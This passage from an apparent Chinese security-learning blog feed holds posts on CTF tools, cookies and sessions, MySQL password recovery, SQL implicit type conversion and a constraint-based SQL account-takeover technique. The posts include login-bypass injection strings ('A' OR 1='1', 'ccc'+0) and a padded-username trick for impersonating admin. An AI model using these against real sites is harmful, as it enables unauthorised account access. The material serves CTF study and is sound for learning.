    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF Tools</title>
    <link href="/2017/08/11/ctf_tools_list/"/>
    <url>/2017/08/11/ctf_tools_list/</url>
    
    <content type="html"><![CDATA[<h2 id="CTF-Tools-List"><a href="#CTF-Tools-List" class="headerlink" title="CTF Tools List"></a>CTF Tools List</h2><p>打CTF首先需要了解有哪些方向和一些常见的工具，并提供部分下载地址，希望能给一些刚刚接触CTF的童鞋一些指导（大牛勿喷）</p><span id="more"></span><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>为顺利进行CTF比赛，发布以下常用工具列表，请各位参赛选手在比赛开始前完成相关软件的下载及安装。</p><p>欢迎提交补充CTF比赛相关软件及软件官方网站，提交软件（非常规软件）需包含软件MD5及SHA1校验。</p><h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><p>由于GFW的封锁，国外部分网站访问受限，推荐使用以下VPN类工具。</p><ul><li><p>GoAgent</p><p>  官方网站：<a href="https://code.google.com/p/goagent/">https://code.google.com/p/goagent/</a></p></li><li><p>云梯VPN</p><p>  官方网站：<a href="https://www.ytgate.com/">https://www.ytgate.com/</a></p></li></ul><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><ul><li><p>虚拟机管理</p><ul><li><strong>VMware WorkStation (推荐)</strong></li><li>VMware Player</li><li>Virtual Box</li><li>Microsoft Virtual PC</li></ul></li><li><p>虚拟机镜像（<strong>32位及64位</strong>）</p><ul><li><strong>Kali Linux （必备）</strong><br>虚拟机镜像：<a href="http://images.offensive-security.com/kali-linux-1.0.6-vm-i486.7z">http://images.offensive-security.com/kali-linux-1.0.6-vm-i486.7z</a></li><li><strong>Windows XP （必备）</strong></li><li>Windows Server 2003</li></ul></li></ul><h2 id="编程环境"><a href="#编程环境" class="headerlink" title="编程环境"></a>编程环境</h2><ul><li>C&#x2F;C++</li><li>Java&#x2F;Android</li><li>Python</li><li>PHP</li><li>Perl</li><li>Matlab</li></ul><h2 id="PPC-CRYPTO"><a href="#PPC-CRYPTO" class="headerlink" title="PPC &amp; CRYPTO"></a>PPC &amp; CRYPTO</h2><ul><li><p>常见密码（加解密，Hash）算法的运算库</p><ul><li>凯撒移位</li><li>DES</li><li>RSA</li><li>MD5</li><li>SHA1</li><li>CRC</li></ul></li><li><p>常见编码（base64）的运算库</p><ul><li>Base64</li><li>URL</li><li>HEX</li><li>ANSI</li><li>UNICODE</li></ul></li></ul><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><ul><li><p>IDA</p><p>  官方网站：<a href="https://www.hex-rays.com/products/ida/support/download.shtml">https://www.hex-rays.com/products/ida/support/download.shtml</a></p><p>  说明：官网提供 IDA 5.0 正式版及 IDA 6.5 试用版，推荐Google下载 IDA 6.1 版及 IDA 6.4 版。</p></li><li><p>Ollydbg</p><p>  官方网站：<a href="http://www.ollydbg.de/">http://www.ollydbg.de/</a></p><p>  说明：官网版本为英文，推荐下载“吾爱破解”论坛版</p></li><li><p>WinDbg</p><p>  WinDbg 6.12.2.633 官网下载链接：</p><ul><li><a href="http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools/dbg_x86.msi">dbg_x86.msi</a></li><li><a href="http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools_amd64/dbg_amd64.msi">dbg_amd64.msi</a></li></ul></li><li><p>gdb(Linux)</p></li><li><p>Peda</p><p>  官方网站：<a href="https://github.com/longld/peda/">https://github.com/longld/peda/</a></p></li><li><p>gcc（linux）</p></li></ul><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><ul><li><p>Burp Suite（推荐）</p><p>  官方网站：<a href="http://portswigger.net/burp/">http://portswigger.net/burp/</a></p><p>  说明：官网提供 Burp Suite 1.6 Free 版本，推荐下载 Burp Suite 1.6 Professional Crack 版本</p></li><li><p>Wireshark（推荐）</p></li></ul><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><ul><li><p>HXD&#x2F;WinHex</p></li><li><p>Stegsolve</p><p>  官方下载：<a href="http://www.caesum.com/handbook/Stegsolve.jar">http://www.caesum.com/handbook/Stegsolve.jar</a></p></li><li><p>Foremost（提供）</p></li><li><p>Pngcheck（自备）</p></li><li><p>Pngmeta（自备）</p></li><li><p>Vim（自备） </p></li><li><p>Winmerg（提供）</p></li><li><p>7zip（提供）</p></li><li><p>二维码阅读器(自备)</p></li><li><p>图片阅读编辑器（画图，ps等,自备）</p></li></ul><h2 id="OTHER"><a href="#OTHER" class="headerlink" title="OTHER"></a>OTHER</h2><ul><li><p>Putty</p></li><li><p>VNC-Viewer</p></li><li><p>SecureCRT</p></li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="http://blue-whale.me/2014/03/tools-list.html">Tools List</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>CTF Tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>有关 cookie 和session的一些探究</title>
    <link href="/2017/07/30/cookie/"/>
    <url>/2017/07/30/cookie/</url>
    
    <content type="html"><![CDATA[<h1 id="cookie-的传递过程"><a href="#cookie-的传递过程" class="headerlink" title="cookie 的传递过程"></a>cookie 的传递过程</h1><p>今天没事，突然想到cookie的一些问题，于是就打算自己尝试一下。</p><p>php源代码如下：</p><pre><code class="hljs">&lt;?phpsetcookie(&#39;xxx&#39;, &#39;yyyyyyyyyyyyy&#39;);  print_r($_COOKIE);?&gt;</code></pre><span id="more"></span><p>当浏览器请求这个页面时，服务器会自动设置cookie为 xxx:yyyyyyyyyyyyy 并且会把服务器端的$COOKIE数组中的所有值打印出来。</p><h2 id="第一次访问页面"><a href="#第一次访问页面" class="headerlink" title="第一次访问页面"></a>第一次访问页面</h2><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AE%BF%E9%97%AE.png" alt="image"></p><p>我们可以看到，响应头中有xxx:yyyyyyyyyyyyy 这个cookie 说明服务端正在告诉浏览器，命令他把 cookie设置成这个值，下次访问这个页面的时候再发给服务端。注意观察，此时的请求头中并没有cookie字样，服务端的cookie数组也是空，也就是说第一次访问并没有带cookie 服务端也就没有保存cookie。</p><h2 id="第二次访问页面"><a href="#第二次访问页面" class="headerlink" title="第二次访问页面"></a>第二次访问页面</h2><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%AE%BF%E9%97%AE.png" alt="image"></p><p>我们看到，浏览器听从了服务器的指令，把自己的cookie设置成了约定好的值，发送给服务器，服务器也把这个值存到自己的$_COOKIE中。</p><h1 id="cookie-如何维持登录"><a href="#cookie-如何维持登录" class="headerlink" title="cookie 如何维持登录"></a>cookie 如何维持登录</h1><p>用户的登录信息会保存(加密)在cookie中，当用户再次访问的时候服务器会解密cookie，把信息和数据库中的用户信息比对，一致就自动访问了，不用客户端再输入信息。</p><h1 id="如何进行cookie-欺骗"><a href="#如何进行cookie-欺骗" class="headerlink" title="如何进行cookie 欺骗"></a>如何进行cookie 欺骗</h1><h1 id="另一种机制-session"><a href="#另一种机制-session" class="headerlink" title="另一种机制 session"></a>另一种机制 session</h1><p>Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上，这就是session.</p><p>那么Session在何时创建呢？不同的语言有不同的实现方试。</p><p>在创建了Session的同时，服务器会为该Session生成唯一的Session id，而这个Session id在随后的请求中会被用来重新获得已经创建的Session；在Session被创建之后，就可以调用Session相关的方法往Session中增加内容了，而这些内容只会保存在服务器中，发到客户端的只有Session id；当客户端再次发送请求的时候，会将这个Session id带上，服务器接受到请求之后就会依据Session id找到相应的Session，从而再次使用之。正式这样一个过程，用户的状态也就得以保持了。</p><p>而session id 的传输需要cookie的配合，这也就是经常在cookie 中看到sessionID的原因了</p><h1 id="cookie-和session的区别"><a href="#cookie-和session的区别" class="headerlink" title="cookie 和session的区别"></a>cookie 和session的区别</h1><p>1.cookie数据存放在客户的浏览器上，session数据放在服务器上；</p><p>2.cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗，考虑到安全应当使用session；</p><p>3.session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能。考虑到减轻服务器性能方面，应当使用COOKIE；</p><p>4.单个cookie在客户端的限制是3K，就是说一个站点在客户端存放的COOKIE不能超过3K；</p>]]></content>
    
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql 修改密码的一些小问题</title>
    <link href="/2017/07/26/mysqlyuequan/"/>
    <url>/2017/07/26/mysqlyuequan/</url>
    
    <content type="html"><![CDATA[<h1 id="mysql-数据库修改密码一定要同步phpmyadmin"><a href="#mysql-数据库修改密码一定要同步phpmyadmin" class="headerlink" title="mysql 数据库修改密码一定要同步phpmyadmin"></a>mysql 数据库修改密码一定要同步phpmyadmin</h1><p>记得修改  wamp&#x2F;apps&#x2F;phpmyadmin&#x2F;conifg.inc.php<br>把对应的密码项改成自己需要的</p><h1 id="修改密码导致的没有权限问题需要修改配置越权访问修改密码"><a href="#修改密码导致的没有权限问题需要修改配置越权访问修改密码" class="headerlink" title="修改密码导致的没有权限问题需要修改配置越权访问修改密码"></a>修改密码导致的没有权限问题需要修改配置越权访问修改密码</h1><span id="more"></span><p>这东西坑了我一下午。。。。。。</p><p>因为手贱忘记了命令还擅自尝试用命令修改密码，导致再登录时发现不仅密码没有修改成功，而且自己的root权限丢失<br>，数据库只剩下了 information_schema 和test,再尝试用phpmyadmin和mysql命令行都失效，说我没有权限。这就很尴尬了，都没有权限了怎么修改，后来网上查到了修改sql配置越权访问。</p><p>如下：</p><pre><code class="hljs">修改MySQL数据库目录配置文件：my.cnf（或my.ini）[mysqld]下添加skip-grant-tables重启mysql服务，然后用mysql 登录进入后，可以看到，mysql数据库已呈现，然后修改密码：update mysql.user set password=password(&#39;root&#39;) where user=&#39;root&#39;;flush privileges;退出mysql，修改配置文件my.cnf（my.ini） 把刚才的skip-grant-tables注释掉重启mysql服务，然后就可以用用户名，密码登录。注意： 这里一定要用到password（‘’）函数才能修改密码。</code></pre><p>后来我试了试可以访问了，但phpmyadmin的用户那栏不见了还是不行，又重启了计算机才好的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然手贱，但是还是学到了一些新姿势。</p>]]></content>
    
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL基本知识以及一些发现</title>
    <link href="/2017/06/04/sqlbase/"/>
    <url>/2017/06/04/sqlbase/</url>
    
    <content type="html"><![CDATA[<h2 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h2><p>在sql的学习过程中经常会遇到一些奇奇怪怪的东西，有些没有实际操作也不知道情况究竟是怎么样的，于是特地拿出来实操一下。</p><h2 id="基本的创建删除操作"><a href="#基本的创建删除操作" class="headerlink" title="基本的创建删除操作"></a>基本的创建删除操作</h2><p>1.创建一个数据库：create database 库名;</p><span id="more"></span><p>2.查看一共有哪些库： show databases;</p><p>3.选择需要用的库: use 库名;</p><p>4.创建一个表: create table 表名 (字段1 类型，字段2 类型，字段3 类型 …);</p><p>5.往表中插入内容：<br>insert into 表名 values(内容1，内容2，内容3)；</p><p>insert into 表名 (字段1，字段3) values(内容1，内容3);</p><p>注意：内容如果是varchar()则必须加上引号！！！</p><p>6.查看表的内容 ： select * from 表名;</p><p>7.给表添加字段 ： alert table 表名 add 字段名 类型;</p><p>7.删除某字段中的某个值： update 表名 set 字段名&#x3D;NULL where 字段名&#x3D;值;</p><p>8.删除一整行：delect from 表名 where 字段名&#x3D;值；</p><p>9.删除某一个字段：alert table 表名 drop 字段名；</p><p>10删除一个表 : drop table 表名；</p><p>11删除一个数据库： drop database 库名；</p><p>12.查看警告: show warnings;</p><p>13.查看库里面的表名: show tables from 库名</p><h2 id="where-的技巧"><a href="#where-的技巧" class="headerlink" title="where 的技巧"></a>where 的技巧</h2><h3 id="先贴上原始的表"><a href="#先贴上原始的表" class="headerlink" title="先贴上原始的表"></a>先贴上原始的表</h3><p>由于实验需要换一个表</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%95%B4%E4%B8%AA%E8%A1%A8.png" alt="原始表"></p><p>理解这个对于后面讲其他复杂的东西的理解是有帮助的。</p><p>where是select的过滤器，where用来过滤select出来的内容。比如说：<br>select * from table where id&#x3D;1; 意思是把table里面的所有内容，经过过滤器过滤，过滤出id&#x3D;1的内容，显示出来。再比如,select * from table where id&#x3D;3 or id&#x3D;2 or a&#x3D;’asd’;就是把id&#x3D;3或id&#x3D;2或a&#x3D;’asd’的内容过滤出来。那么我们就对b的内容过滤呢，也是一样，把*改成b就行了。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/where%E8%BF%87%E6%BB%A4.png" alt="where过滤"></p><h3 id="深入一点"><a href="#深入一点" class="headerlink" title="深入一点"></a>深入一点</h3><p>如果我们 or后面跟的不是 字段&#x3D;值 的形式会怎么样？我们就跟一个1&#x3D;1试一下。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/1=1.png" alt="1&#x3D;1"></p><p>全部返回，证实了我们的推论，在过滤的过程中后面恒为真，所以每条数据都满足条件。</p><p>那我们要是跟一个字段呢？</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%B7%9F%E5%AD%97%E6%AE%B5.png" alt="跟字段"></p><p>咦？很奇怪吧，按理说a包含了全部的内容，遍历a应该返回全部内容的。其实这里面涉及到 mysql 对字符串和数字的处理机制。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%AF%B9%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%A4%84%E7%90%86.png" alt="数字和字符串"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%98%AF%E5%81%87.png" alt="字符串是假"></p><p>mysql 认为以数字开头的字符串就是数字本身，并且在用or的时候认为数字是真，字符串是假。</p><h3 id="where-语句的小利用"><a href="#where-语句的小利用" class="headerlink" title="where 语句的小利用"></a>where 语句的小利用</h3><p>常常在where 后面跟上一些正确的语句，添加上猜测的字段，来判断字段是否存在。<br>or 判断</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/or%E5%88%A4%E6%96%AD.png" alt="or判断"><br>in 判断</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/inp%E5%88%A4%E6%96%AD.png" alt="in判断"></p><p>between判断</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/between%E5%88%A4%E6%96%AD.png" alt="between判断"></p><p>like 判断</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/like%E5%88%A4%E6%96%AD.png" alt="like判断"><br>……</p><p>小结：猜测列的时候可以用一下</p><h2 id="concat-和group-concat"><a href="#concat-和group-concat" class="headerlink" title="concat()和group_concat()"></a>concat()和group_concat()</h2><p>union select 1,2,concat(列) from 表，可以把两个标的内容拼成一个表，其中1,2对应的是union前面表的第一第二个字段。<br>union select 1,2,group_concat(列) from 表;可以把列的所有内容组成一行输出，这对于有些时候想在一行输出的时候很有用（原本是与group y 组合使用，意思是按照group by 的那一列分组，输出相同group by 值得，现在没有group by 只好全部输出）<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/concat%E5%92%8Cgroup_concat.png" alt="group_concat"></p><h2 id="NULL-FALSE-‘’-0"><a href="#NULL-FALSE-‘’-0" class="headerlink" title="NULL FALSE ‘’ 0"></a>NULL FALSE ‘’ 0</h2><p>这几个的比较我们来试一试</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select * from pass where 0=false;</span><br><span class="hljs-section">+------+------------------+-------------+</span><br><span class="hljs-section">| id   | a                | b           |</span><br><span class="hljs-section">+------+------------------+-------------+</span><br>|    1 | asd              | qsdf        |<br>|    2 | dfg              | 1op         |<br>|    3 | hoioi            | 656lkahlkf  |<br>|    4 | adshfasd         | aosijfiadfn |<br>|    5 | 2354asfaijdkvsjf | oioo        |<br><span class="hljs-section">|    6 | 99iad            | 9okomuh     |</span><br><span class="hljs-section">+------+------------------+-------------+</span><br>6 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select * from pass where &#x27;&#x27;=false;</span><br><span class="hljs-section">+------+------------------+-------------+</span><br><span class="hljs-section">| id   | a                | b           |</span><br><span class="hljs-section">+------+------------------+-------------+</span><br>|    1 | asd              | qsdf        |<br>|    2 | dfg              | 1op         |<br>|    3 | hoioi            | 656lkahlkf  |<br>|    4 | adshfasd         | aosijfiadfn |<br>|    5 | 2354asfaijdkvsjf | oioo        |<br><span class="hljs-section">|    6 | 99iad            | 9okomuh     |</span><br><span class="hljs-section">+------+------------------+-------------+</span><br>6 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>发现 ‘’ 和0 在mysql 看来都是false</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> pass <span class="hljs-keyword">where</span> <span class="hljs-number">0</span><span class="hljs-operator">=</span><span class="hljs-keyword">null</span>;<br><span class="hljs-keyword">Empty</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> pass <span class="hljs-keyword">where</span> <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-operator">=</span><span class="hljs-keyword">null</span>;<br><span class="hljs-keyword">Empty</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> pass <span class="hljs-keyword">where</span> <span class="hljs-keyword">null</span><span class="hljs-operator">=</span><span class="hljs-keyword">null</span>;<br><span class="hljs-keyword">Empty</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><p>但是NULL比较奇葩，什么和他比较都是假，包括他自己，但是有一种情况下为真</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select * from pass where NULL&lt;=&gt;NULL;</span><br><span class="hljs-section">+------+------------------+-------------+</span><br><span class="hljs-section">| id   | a                | b           |</span><br><span class="hljs-section">+------+------------------+-------------+</span><br>|    1 | asd              | qsdf        |<br>|    2 | dfg              | 1op         |<br>|    3 | hoioi            | 656lkahlkf  |<br>|    4 | adshfasd         | aosijfiadfn |<br>|    5 | 2354asfaijdkvsjf | oioo        |<br><span class="hljs-section">|    6 | 99iad            | 9okomuh     |</span><br><span class="hljs-section">+------+------------------+-------------+</span><br>6 rows in set (0.01 sec)<br></code></pre></td></tr></table></figure><h2 id="隐式类型转换"><a href="#隐式类型转换" class="headerlink" title="隐式类型转换"></a>隐式类型转换</h2><h3 id="概念和例子"><a href="#概念和例子" class="headerlink" title="概念和例子"></a>概念和例子</h3><p>本质上就是mysql 对于字符和数字的比较等方面的处理，<br>不只是这个方面。</p><p>官方文档的翻译如下：<br>1.两个参数至少有一个是 NULL 时，比较的结果也是 NULL，例外是使用 &lt;&#x3D;&gt; 对两个 NULL 做比较时会返回 1，这两种情况都不需要做类型转换</p><p>2.两个参数都是字符串，会按照字符串来比较，不做类型转换</p><p>3.两个参数都是整数，按照整数来比较，不做类型转换</p><p>4.十六进制的值和非数字做比较时，会被当做二进制串</p><p>5.有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为 timestamp</p><p>6.有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较</p><p>7.所有其他情况下，两个参数都会被转换为浮点数再进行比较</p><p>重点在第七个，这也是我们刚刚讨论where or时候遇到的问题，现在有了自己的名字，叫隐式类型转换。<br>一个例子：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select &#x27;a&#x27; + &#x27;b&#x27;;</span><br><span class="hljs-section">+-----------+</span><br><span class="hljs-section">| &#x27;a&#x27; + &#x27;b&#x27; |</span><br><span class="hljs-section">+-----------+</span><br><span class="hljs-section">|  0 |</span><br><span class="hljs-section">+-----------+</span><br>1 row in set, 2 warnings (0.00 sec)<br><span class="hljs-section">mysql&gt; show warnings;</span><br><span class="hljs-section">+---------+------+---------------------------------------+</span><br><span class="hljs-section">| Level | Code | Message    |</span><br><span class="hljs-section">+---------+------+---------------------------------------+</span><br>| Warning | 1292 | Truncated incorrect DOUBLE value: <span class="hljs-emphasis">&#x27;a&#x27;</span> |<br><span class="hljs-section">| Warning | 1292 | Truncated incorrect DOUBLE value: &#x27;b&#x27; |</span><br><span class="hljs-section">+---------+------+---------------------------------------+</span><br>2 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>是不是有点郁闷呢？</p><p>之所以出现这种情况，是因为+为算术操作符arithmetic operator 这样就可以解释为什么a和b都转换为double了。因为转换之后其实就是：0+0&#x3D;0了。</p><p>推荐一链接：<br><a href="http://www.jb51.net/article/101531.htm"></a></p><h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><p>假如应用前端没有WAF防护，那么下面的sql很容易注入：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta">mysql&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> t_account <span class="hljs-keyword">where</span> fname=<span class="hljs-string">&#x27;A&#x27;</span> ;<br>fname传入 A<span class="hljs-string">&#x27; OR 1=&#x27;</span><span class="hljs-number">1</span> <br>mysql&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> t_account <span class="hljs-keyword">where</span> fname=<span class="hljs-string">&#x27;A&#x27;</span> OR <span class="hljs-number">1</span>=<span class="hljs-string">&#x27;1&#x27;</span>;<br></code></pre></td></tr></table></figure><p>攻击者更聪明一点： fname传入 A’+’B ，fpassword传入 ccc’+0 ：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select * from t_account where fname=&#x27;A&#x27;+&#x27;B&#x27; and fpassword=&#x27;ccc&#x27;+0;</span><br><span class="hljs-section">+-----+-----------+-------------+</span><br><span class="hljs-section">| fid | fname  | fpassword |</span><br><span class="hljs-section">+-----+-----------+-------------+</span><br>| 1 | xiaoming | p<span class="hljs-emphasis">_xiaoming |</span><br><span class="hljs-emphasis">| 2 | xiaoming1 | p_</span>xiaoming1 |<br><span class="hljs-code">+-----+</span>-----------<span class="hljs-code">+-------------+</span><br>2 rows in set, 7 warnings (0.00 sec)<br></code></pre></td></tr></table></figure><p><a href="http://www.jb51.net/article/101531.htm"></a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于约束的SQL攻击</title>
    <link href="/2017/06/03/passsignup/"/>
    <url>/2017/06/03/passsignup/</url>
    
    <content type="html"><![CDATA[<h2 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h2><p>关于sql中insert 和 select 对长度和空格的处理方式差异造成的漏洞</p><h2 id="背景分析"><a href="#背景分析" class="headerlink" title="背景分析"></a>背景分析</h2><p>现在的注册页面的逻辑是这样的：</p><p>1.用select * from table where username&#x3D;’$username’检测你输入的用户名，如果存在，说明你注册过，那么不让你注册。</p><span id="more"></span><p>2.用户名不存在，用 insert into table values(‘$username’,’$password’)把你输入的用户名密码插入数据库。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>select 语句对于参数后面空格的处理是删除，insert只是截取最大长度的字符串，然后插入数据库。</p><p>假设最大长度限制为25 我们输入用户名为 admin[20个空格]1,密码随意。脚本查询的时候因为用了select 语句，空格被删除，剩下了admin1。</p><p>假设数据库里面只有一个admin,所以查不到，因此重新注册为新用户，但是注册的时候用的是insert语句，他不会删除空格，只是截取最大长度的字符串，也就是admin[20个空格]，和自己设的密码插入到数据库，作为新的用户。</p><p>这时候如果我们用admin 去查找，用select语句，就会返回两条记录，一条是真正的admin另一条是我们绕过用户名检测假的admin(数据库里面的空格也在查询的时候被删除了再比较)，这时我们用admin和自己设的密码就可以登陆了。</p><h2 id="本地演示"><a href="#本地演示" class="headerlink" title="本地演示"></a>本地演示</h2><p>1.数据空中的真正的用户（我们要绕过的用户）<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8E%9F%E5%A7%8B.png" alt="image"></p><p>2.看看空格是不是被删了<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A41.png" alt="image"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A42.png" alt="image"></p><p>3.insert 连空格一起插入<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%8F%92%E5%85%A5.png" alt="image"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%8F%92%E5%85%A5%E6%88%90%E5%8A%9F.png" alt="image"></p><p>4.模拟用假密码登陆真用户<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%99%BB%E9%99%86.png" alt="image"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这种绕过方式利用的是select 和 insert 的差异性,其实差异性也是漏洞的根本成因之一，要多多留心</p><p>本文参考：<br><a href="http://www.freebuf.com/articles/web/124537.html"></a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwnhub的一道关于流量包的misc</title>
    <link href="/2017/05/31/pwhwireshark/"/>
    <url>/2017/05/31/pwhwireshark/</url>
    
